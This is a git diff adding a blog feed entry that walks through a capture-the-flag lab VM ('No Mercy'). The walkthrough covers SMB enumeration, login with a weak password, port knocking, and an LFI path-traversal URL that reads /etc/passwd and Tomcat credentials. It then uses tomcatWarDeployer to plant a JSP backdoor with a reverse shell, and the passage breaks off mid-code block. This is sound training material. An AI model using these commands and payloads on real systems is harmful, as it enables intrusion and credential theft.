@@ -4,7 +4,7 @@
   <title><![CDATA[Core dump overflow]]></title>
   <link href="http://chousensha.github.io/atom.xml" rel="self"/>
   <link href="http://chousensha.github.io/"/>
-  <updated>2019-05-30T22:11:54+03:00</updated>
+  <updated>2019-06-09T21:54:05+03:00</updated>
   <id>http://chousensha.github.io/</id>
   <author>
     <name><![CDATA[chousensha]]></name>
@@ -12,6 +12,772 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[No Mercy]]></title>
+    <link href="http://chousensha.github.io/blog/2019/06/09/no-mercy/"/>
+    <updated>2019-06-09T21:43:54+03:00</updated>
+    <id>http://chousensha.github.io/blog/2019/06/09/no-mercy</id>
+    <content type="html"><![CDATA[<p>Today&rsquo;s VM is inspired from the OSCP labs!</p>
+
+<!-- more -->
+
+
+<p>There are quite a few ports open, and some filtered:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>PORT     STATE    SERVICE     VERSION
+</span><span class='line'>22/tcp   filtered ssh
+</span><span class='line'>53/tcp   open     domain      ISC BIND 9.9.5-3ubuntu0.17 (Ubuntu Linux)
+</span><span class='line'>| dns-nsid:
+</span><span class='line'>|_  bind.version: 9.9.5-3ubuntu0.17-Ubuntu
+</span><span class='line'>80/tcp   filtered http
+</span><span class='line'>110/tcp  open     pop3        Dovecot pop3d
+</span><span class='line'>|_pop3-capabilities: SASL PIPELINING CAPA TOP UIDL AUTH-RESP-CODE STLS RESP-CODES
+</span><span class='line'>|_ssl-date: TLS randomness does not represent time
+</span><span class='line'>139/tcp  open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+</span><span class='line'>143/tcp  open     imap        Dovecot imapd (Ubuntu)
+</span><span class='line'>|_imap-capabilities: STARTTLS more have IMAP4rev1 post-login ID listed SASL-IR LOGINDISABLEDA0001 ENABLE LITERAL+ capabilities LOGIN-REFERRALS IDLE Pre-login OK
+</span><span class='line'>|_ssl-date: TLS randomness does not represent time
+</span><span class='line'>445/tcp  open     netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
+</span><span class='line'>993/tcp  open     ssl/imaps?
+</span><span class='line'>|_ssl-date: TLS randomness does not represent time
+</span><span class='line'>995/tcp  open     ssl/pop3s?
+</span><span class='line'>|_ssl-date: TLS randomness does not represent time
+</span><span class='line'>8080/tcp open     http        Apache Tomcat/Coyote JSP engine 1.1
+</span><span class='line'>| http-methods:
+</span><span class='line'>|_  Potentially risky methods: PUT DELETE
+</span><span class='line'>|_http-open-proxy: Proxy might be redirecting requests
+</span><span class='line'>| http-robots.txt: 1 disallowed entry
+</span><span class='line'>|_/tryharder/tryharder
+</span><span class='line'>|_http-server-header: Apache-Coyote/1.1
+</span><span class='line'>|_http-title: Apache Tomcat</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The available web server is a Tomcat installation. In the <a href="http://192.168.159.137:8080/tryharder/tryharder">http://192.168.159.137:8080/tryharder/tryharder</a> we find a base64 string:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>SXQncyBhbm5veWluZywgYnV0IHdlIHJlcGVhdCB0aGlzIG92ZXIgYW5kIG92ZXIgYWdhaW46IGN5YmVyIGh5Z2llbmUgaXMgZXh0cmVtZWx5IGltcG9ydGFudC4gUGxlYXNlIHN0b3Agc2V0dGluZyBzaWxseSBwYXNzd29yZHMgdGhhdCB3aWxsIGdldCBjcmFja2VkIHdpdGggYW55IGRlY2VudCBwYXNzd29yZCBsaXN0LgoKT25jZSwgd2UgZm91bmQgdGhlIHBhc3N3b3JkICJwYXNzd29yZCIsIHF1aXRlIGxpdGVyYWxseSBzdGlja2luZyBvbiBhIHBvc3QtaXQgaW4gZnJvbnQgb2YgYW4gZW1wbG95ZWUncyBkZXNrISBBcyBzaWxseSBhcyBpdCBtYXkgYmUsIHRoZSBlbXBsb3llZSBwbGVhZGVkIGZvciBtZXJjeSB3aGVuIHdlIHRocmVhdGVuZWQgdG8gZmlyZSBoZXIuCgpObyBmbHVmZnkgYnVubmllcyBmb3IgdGhvc2Ugd2hvIHNldCBpbnNlY3VyZSBwYXNzd29yZHMgYW5kIGVuZGFuZ2VyIHRoZSBlbnRlcnByaXNlLg==</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Decoding this hints at insecure passwords:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>It's annoying, but we repeat this over and over again: cyber hygiene is extremely important. Please stop setting silly passwords that will get cracked with any decent password list.
+</span><span class='line'>
+</span><span class='line'>Once, we found the password "password", quite literally sticking on a post-it in front of an employee's desk! As silly as it may be, the employee pleaded for mercy when we threatened to fire her.
+</span><span class='line'>
+</span><span class='line'>No fluffy bunnies for those who set insecure passwords and endanger the enterprise.</span></code></pre></td></tr></table></div></figure>
+
+
+<p>From all the other services, the one that seems most likely to be bruteforced is Samba. So let&rsquo;s have a look:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>smbmap -H 192.168.159.137
+</span><span class='line'>[+] Finding open SMB ports....
+</span><span class='line'>[+] Guest SMB session established on 192.168.159.137...
+</span><span class='line'>[+] IP: 192.168.159.137:445   Name: 192.168.159.137
+</span><span class='line'>  Disk                                                    Permissions
+</span><span class='line'>  ----                                                    -----------
+</span><span class='line'>  print$                                              NO ACCESS
+</span><span class='line'>  qiu                                                 NO ACCESS
+</span><span class='line'>  IPC$                                                NO ACCESS</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The <em>qiu</em> share is what we want to look at. Running <strong>enum4linux</strong> we find 2 accounts:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>================================
+</span><span class='line'>|    Users on 192.168.159.137    |
+</span><span class='line'>================================
+</span><span class='line'>index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: pleadformercy  Name: QIU   Desc:
+</span><span class='line'>index: 0x2 RID: 0x3e9 acb: 0x00000010 Account: qiu    Name:   Desc:</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Following the hint, I tried the share with a password of <em>password</em> and it worked for user <em>qiu</em>:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>smbclient //192.168.159.137/qiu -U qiu
+</span><span class='line'>Enter WORKGROUP\qiu's password:
+</span><span class='line'>Try "help" to get a list of possible commands.
+</span><span class='line'>smb: \&gt; ls
+</span><span class='line'>  .                                   D        0  Fri Aug 31 15:07:00 2018
+</span><span class='line'>  ..                                  D        0  Mon Nov 19 11:59:09 2018
+</span><span class='line'>  .bashrc                             H     3637  Sun Aug 26 09:19:34 2018
+</span><span class='line'>  .public                            DH        0  Sun Aug 26 10:23:24 2018
+</span><span class='line'>  .bash_history                       H      163  Fri Aug 31 15:11:34 2018
+</span><span class='line'>  .cache                             DH        0  Fri Aug 31 14:22:05 2018
+</span><span class='line'>  .private                           DH        0  Sun Aug 26 12:35:34 2018
+</span><span class='line'>  .bash_logout                        H      220  Sun Aug 26 09:19:34 2018
+</span><span class='line'>  .profile                            H      675  Sun Aug 26 09:19:34 2018</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I mounted the share locally for easier browsing with <code>mount -t cifs //192.168.159.137/qiu /mnt/ctf -o username=qiu -o password=password</code>. Then I started looking through what we have. The .bash_history file shows us the last commands entered by user qiu:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>exit
+</span><span class='line'>cd ../
+</span><span class='line'>cd home
+</span><span class='line'>cd qiu
+</span><span class='line'>cd .secrets
+</span><span class='line'>ls -al
+</span><span class='line'>cd .private
+</span><span class='line'>ls
+</span><span class='line'>cd secrets
+</span><span class='line'>ls
+</span><span class='line'>ls -al
+</span><span class='line'>cd ../
+</span><span class='line'>ls -al
+</span><span class='line'>cd opensesame
+</span><span class='line'>ls -al
+</span><span class='line'>./configprint
+</span><span class='line'>sudo configprint
+</span><span class='line'>sudo su -
+</span><span class='line'>exit</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The .public folder contains a message that doesn&rsquo;t seem relevant but is sound advice!</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>cat .public/resources/smiley
+</span><span class='line'>A cheerful smile to start the day is always good. :-)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We have more to check inside .private:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@deck:/mnt/ctf/.private# ls
+</span><span class='line'>opensesame  readme.txt  secrets</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Readme contents are:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>This is for your own eyes only. In case you forget the magic rules for remote administration.</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The secrets folder is empty. Inside <em>opensesame</em> there&rsquo;s a config file that contains port knocking instructions for opening HTTP and SSH:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>cat config
+</span><span class='line'>Here are settings for your perusal.
+</span><span class='line'>
+</span><span class='line'>Port Knocking Daemon Configuration
+</span><span class='line'>
+</span><span class='line'>[options]
+</span><span class='line'>  UseSyslog
+</span><span class='line'>
+</span><span class='line'>[openHTTP]
+</span><span class='line'>  sequence    = 159,27391,4
+</span><span class='line'>  seq_timeout = 100
+</span><span class='line'>  command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 80 -j ACCEPT
+</span><span class='line'>  tcpflags    = syn
+</span><span class='line'>
+</span><span class='line'>[closeHTTP]
+</span><span class='line'>  sequence    = 4,27391,159
+</span><span class='line'>  seq_timeout = 100
+</span><span class='line'>  command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 80 -j ACCEPT
+</span><span class='line'>  tcpflags    = syn
+</span><span class='line'>
+</span><span class='line'>[openSSH]
+</span><span class='line'>  sequence    = 17301,28504,9999
+</span><span class='line'>  seq_timeout = 100
+</span><span class='line'>  command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
+</span><span class='line'>  tcpflags    = syn
+</span><span class='line'>
+</span><span class='line'>[closeSSH]
+</span><span class='line'>  sequence    = 9999,28504,17301
+</span><span class='line'>  seq_timeout = 100
+</span><span class='line'>  command     = /sbin/iptables -D iNPUT -s %IP% -p tcp --dport 22 -j ACCEPT
+</span><span class='line'>  tcpflags    = syn</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I used a quick Bash one-liner for the port knocking:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>for port in 159 27391 4; do nmap -Pn --host-timeout 100 --max-retries 0 -p $port 192.168.159.137; done</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now port 80 was opened and we find a message stating that: &ldquo;This machine shall make you plead for mercy! Bwahahahahaha!&rdquo;. In the robots.txt file we find 2 entries:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Disallow: /mercy
+</span><span class='line'>Disallow: /nomercy</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Inside /mercy there&rsquo;s an index file that hints at possible RCE:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Welcome to Mercy!
+</span><span class='line'>
+</span><span class='line'>We hope you do not plead for mercy too much. If you do, please help us upgrade our website to allow our visitors to obtain more than just the local time of our system.</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Inside /nomercy there&rsquo;s a <a href="https://github.com/robocoder/rips-scanner">RIPS installation</a>. RIPS is a PHP static scanner that looks for vulnerabilities in the source code.</p>
+
+<p><img class="center" src="http://chousensha.github.io/images/pentest/mercy/rips.png" title="rips" alt="rips"></p>
+
+<p>The version 0.53 is vulnerable to a <a href="https://www.exploit-db.com/exploits/18660">LFI exploit</a>. Going to <a href="http://192.168.159.137/nomercy/windows/code.php?file=../../../../../../etc/passwd">http://192.168.159.137/nomercy/windows/code.php?file=../../../../../../etc/passwd</a> gives us the contents of the passwd file. Here are the last 4 users:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;? pleadformercy:x:1000:1000:pleadformercy:/home/pleadformercy:/bin/bash
+</span><span class='line'>&lt;? qiu:x:1001:1001:qiu:/home/qiu:/bin/bash
+</span><span class='line'>&lt;? thisisasuperduperlonguser:x:1002:1002:,,,:/home/thisisasuperduperlonguser:/bin/bash
+</span><span class='line'>&lt;? fluffy:x:1003:1003::/home/fluffy:/bin/sh</span></code></pre></td></tr></table></div></figure>
+
+
+<p>With this LFI, we can take a look at the <code>/etc/tomcat7/tomcat-users.xml</code> to search for credentials:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;? &lt;role rolename="admin-gui"/&gt;
+</span><span class='line'>&lt;? &lt;role rolename="manager-gui"/&gt;
+</span><span class='line'>&lt;? &lt;user username="thisisasuperduperlonguser" password="heartbreakisinevitable" roles="admin-gui,manager-gui"/&gt;
+</span><span class='line'>&lt;? &lt;user username="fluffy" password="freakishfluffybunny" roles="none"/&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We can now login to Tomcat and upload a reverse shell. I used a nice tool called <a href="https://github.com/mgeeky/tomcatWarDeployer">tomcatWarDeployer</a> that automatically generates and deploys a JSP backdoor.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>python tomcatWarDeployer.py -h
+</span><span class='line'>Usage: tomcatWarDeployer.py [options] server
+</span><span class='line'>
+</span><span class='line'>  server      Specifies server address. Please also include port after colon. May start with http:// or https://
+</span><span class='line'>
+</span><span class='line'>Options:
+</span><span class='line'>  -h, --help            show this help message and exit
+</span><span class='line'>
+</span><span class='line'>  General options:
+</span><span class='line'>    -V, --version       Version information.
+</span><span class='line'>    -v, --verbose       Verbose mode.
+</span><span class='line'>    -s, --simulate      Simulate breach only, do not perform any offensive
+</span><span class='line'>                        actions.
+</span><span class='line'>    -G OUTFILE, --generate=OUTFILE
+</span><span class='line'>                        Generate JSP backdoor only and put it into specified
+</span><span class='line'>                        outfile path then exit. Do not perform any
+</span><span class='line'>                        connections, scannings, deployment and so on.
+</span><span class='line'>    -U USER, --user=USER
+</span><span class='line'>                        Tomcat Manager Web Application HTTP Auth username.
+</span><span class='line'>                        Default=&lt;none&gt;, will try various pairs.
+</span><span class='line'>    -P PASS, --pass=PASS
+</span><span class='line'>                        Tomcat Manager Web Application HTTP Auth password.
+</span><span class='line'>                        Default=&lt;none&gt;, will try various pairs.
+</span><span class='line'>
+</span><span class='line'>  Connection options:
+</span><span class='line'>    -H RHOST, --host=RHOST
+</span><span class='line'>                        Remote host for reverse tcp payload connection. When
+</span><span class='line'>                        specified, RPORT must be specified too. Otherwise,
+</span><span class='line'>                        bind tcp payload will be deployed listening on 0.0.0.0
+</span><span class='line'>    -p PORT, --port=PORT
+</span><span class='line'>                        Remote port for the reverse tcp payload when used with
+</span><span class='line'>                        RHOST or Local port if no RHOST specified thus acting
+</span><span class='line'>                        as a Bind shell endpoint.
+</span><span class='line'>    -u URL, --url=URL   Apache Tomcat management console URL. Default: empty
+</span><span class='line'>    -t TIMEOUT, --timeout=TIMEOUT
+</span><span class='line'>                        Speciifed timeout parameter for socket object and
+</span><span class='line'>                        other timing holdups. Default: 10
+</span><span class='line'>
+</span><span class='line'>  Payload options:
+</span><span class='line'>    -R, --remove        Remove deployed app with specified name. Can be used
+</span><span class='line'>                        for post-assessment cleaning
+</span><span class='line'>    -X PASSWORD, --shellpass=PASSWORD
+</span><span class='line'>                        Specifies authentication password for uploaded shell,
+</span><span class='line'>                        to prevent unauthenticated usage. Default: randomly
+</span><span class='line'>                        generated. Specify "None" to leave the shell
+</span><span class='line'>                        unauthenticated.
+</span><span class='line'>    -T TITLE, --title=TITLE
+</span><span class='line'>                        Specifies head&gt;title for uploaded JSP WAR payload.
+</span><span class='line'>                        Default: "JSP Application"
+</span><span class='line'>    -n APPNAME, --name=APPNAME
+</span><span class='line'>                        Specifies JSP application name. Default: "jsp_app"
+</span><span class='line'>    -x, --unload        Unload existing JSP Application with the same name.
+</span><span class='line'>                        Default: no.
+</span><span class='line'>    -C, --noconnect     Do not connect to the spawned shell immediately. By
+</span><span class='line'>                        default this program will connect to the spawned
+</span><span class='line'>                        shell, specifying this option let's you use other
+</span><span class='line'>                        handlers like Metasploit, NetCat and so on.
+</span><span class='line'>    -f WARFILE, --file=WARFILE
+</span><span class='line'>                        Custom WAR file to deploy. By default the script will
+</span><span class='line'>                        generate own WAR file on-the-fly.</span></code></pre></td></tr></table></div></figure>
+
+
+<p>All I had to do was provide the credentials and the host/port combination. The host specified by the -H flag is where I&rsquo;m expecting the shell:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>python tomcatWarDeployer.py -v -x -p 8888 -H 192.168.159.129 192.168.159.137:8080 -U thisisasuperduperlonguser -P heartbreakisinevitable
+</span><span class='line'>
+</span><span class='line'>        tomcatWarDeployer (v. 0.5.2)
+</span><span class='line'>  Apache Tomcat auto WAR deployment & launching tool
+</span><span class='line'>  Mariusz B. / MGeeky '16-18
+</span><span class='line'>
+</span><span class='line'>Penetration Testing utility aiming at presenting danger of leaving Tomcat misconfigured.
+</span><span class='line'>
+</span><span class='line'>INFO: Reverse shell will connect to: 192.168.159.129:8888.
+</span><span class='line'>DEBUG: Trying Creds: ["thisisasuperduperlonguser:heartbreakisinevitable"]:
+</span><span class='line'>  Browsing to "http://192.168.159.137:8080/"...
+</span><span class='line'>DEBUG: Trying to fetch: "http://192.168.159.137:8080/"
+</span><span class='line'>DEBUG: Trying to fetch: "http://192.168.159.137:8080/manager"
+</span><span class='line'>DEBUG: Probably found something: Apache Tomcat/7.0.52 (Ubuntu)
+</span><span class='line'>INFO: Apache Tomcat/7.0.52 (Ubuntu) Manager Application reached & validated.
+</span><span class='line'>INFO:     At: "http://192.168.159.137:8080/manager"
+</span><span class='line'>DEBUG: Generating JSP WAR backdoor code...
+</span><span class='line'>DEBUG: Preparing additional code for Reverse TCP shell
+</span><span class='line'>DEBUG: Generating temporary structure for jsp_app WAR at: "/tmp/tmpjo2Kgz"
+</span><span class='line'>DEBUG: Working with Java at version: 11.0.3
+</span><span class='line'>DEBUG: Generating web.xml with servlet-name: "JSP Application"
+</span><span class='line'>DEBUG: Generating WAR file at: "/tmp/jsp_app.war"
+</span><span class='line'>DEBUG: adding: META-INF/ (in=0) (out=0) (stored 0%)
+</span><span class='line'>adding: META-INF/MANIFEST.MF (in=56) (out=56) (stored 0%)
+</span><span class='line'>adding: files/ (in=0) (out=0) (stored 0%)
+</span><span class='line'>adding: files/META-INF/ (in=0) (out=0) (stored 0%)
+</span><span class='line'>adding: files/META-INF/MANIFEST.MF (in=66) (out=65) (deflated 1%)
+</span><span class='line'>adding: files/WEB-INF/ (in=0) (out=0) (stored 0%)
+</span><span class='line'>adding: files/WEB-INF/web.xml (in=505) (out=254) (deflated 49%)
+</span><span class='line'>adding: index.jsp (in=4498) (out=1688) (deflated 62%)
+</span><span class='line'>Total:
+</span><span class='line'>------
+</span><span class='line'>(in = 5109) (out = 2917) (deflated 42%)
+</span><span class='line'>DEBUG: Tree command not available. Skipping.
+</span><span class='line'>DEBUG: WAR file structure:
+</span><span class='line'>DEBUG:
+</span><span class='line'>DEBUG: Checking if app jsp_app is deployed at: http://192.168.159.137:8080/manager
+</span><span class='line'>DEBUG: App not deployed.
+</span><span class='line'>INFO: It looks that the application with specified name "jsp_app" has not been deployed yet.
+</span><span class='line'>DEBUG: Deploying application: jsp_app from file: "/tmp/jsp_app.war"
+</span><span class='line'>DEBUG: Removing temporary WAR directory: "/tmp/tmpjo2Kgz"
+</span><span class='line'>INFO: WAR DEPLOYED! Invoking it...
+</span><span class='line'>DEBUG: Spawned shell handling thread. Awaiting for the event...
+</span><span class='line'>DEBUG: Awaiting for reverse-shell handler to set-up
+</span><span class='line'>DEBUG: Establishing listener for incoming reverse TCP shell at 192.168.159.129:8888
+</span><span class='line'>DEBUG: Socket is binded to local port now, awaiting for clients...
+</span><span class='line'>DEBUG: Invoking application at url: "http://192.168.159.137:8080/jsp_app/"
+</span><span class='line'>DEBUG: Adding 'X-Pass: u48rHHa9MRdK' header for shell functionality authentication.
+</span><span class='line'>DEBUG: Incoming client: 192.168.159.137:60760
+</span><span class='line'>DEBUG: Application invoked correctly.
+</span><span class='line'>INFO: ------------------------------------------------------------
+</span><span class='line'>INFO: JSP Backdoor up & running on http://192.168.159.137:8080/jsp_app/
+</span><span class='line'>INFO:
+</span><span class='line'>Happy pwning. Here take that password for web shell: 'u48rHHa9MRdK'
+</span><span class='line'>INFO: ------------------------------------------------------------
+</span><span class='line'>
+</span><span class='line'>INFO: Connected with: tomcat7@MERCY
+</span><span class='line'>
+</span><span class='line'>tomcat7@MERCY $</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Unfortunately, I found this shell too unstable, so I switched to Metasploit and spawned a Meterpreter shell:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
